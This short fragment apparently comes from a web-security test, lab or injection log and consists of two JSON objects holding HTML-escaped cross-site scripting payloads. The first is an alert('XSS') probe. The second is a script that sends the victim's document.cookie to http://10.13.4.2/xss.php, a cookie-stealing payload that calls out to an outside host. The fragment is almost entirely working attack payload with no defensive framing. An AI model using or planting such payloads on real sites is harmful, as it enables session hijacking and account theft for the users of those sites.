```
{
"status": "success",
"message": "&lt;script&gt;alert('XSS')&lt;/script&gt;"
}

{
 "script": "&lt;script&gt;document.location='<http://10.13.4.2/xss.php?cookie='+document.cookie;&lt;/script&gt;>"
}
```